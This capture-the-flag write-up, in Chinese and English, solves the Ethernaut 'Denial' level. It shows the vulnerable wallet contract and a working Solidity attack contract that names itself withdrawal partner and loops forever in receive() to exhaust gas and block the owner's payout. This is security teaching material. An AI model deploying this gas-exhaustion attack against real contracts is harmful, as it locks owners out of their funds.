#   Level 20 Denial
實例地址：`0x5A97bF88570A4234A5Bb75EE5B5455147aaB2025`

##  題目說明
This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

##  POC
目的是要讓該合約在執行 `withdraw()` 時，`owner` 無法獲取貨幣，這關 `withdraw()` 使用 `partner.call` 來傳送 `ether`，並且沒有限制 `gas`，題目再進行測試時呼叫 `withdraw()` 有限制 1M 以下，所以我們可以將 `partner` 設置 `receive` 執行無窮迴圈，當他接受到原合約金額時，執行 `receive`，直到將所剩 `gas` 消耗至剩餘原本 1/64，才會跳脫 `call`，剩餘 `gas` 可能已經無法足夠使用下面指令。

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract Attack{
    constructor(address target){
        Denial(target).setWithdrawPartner(address(this));
        Denial(target).withdraw();
    }

    receive() external payable{
        while(true){
        }
    }
}
```
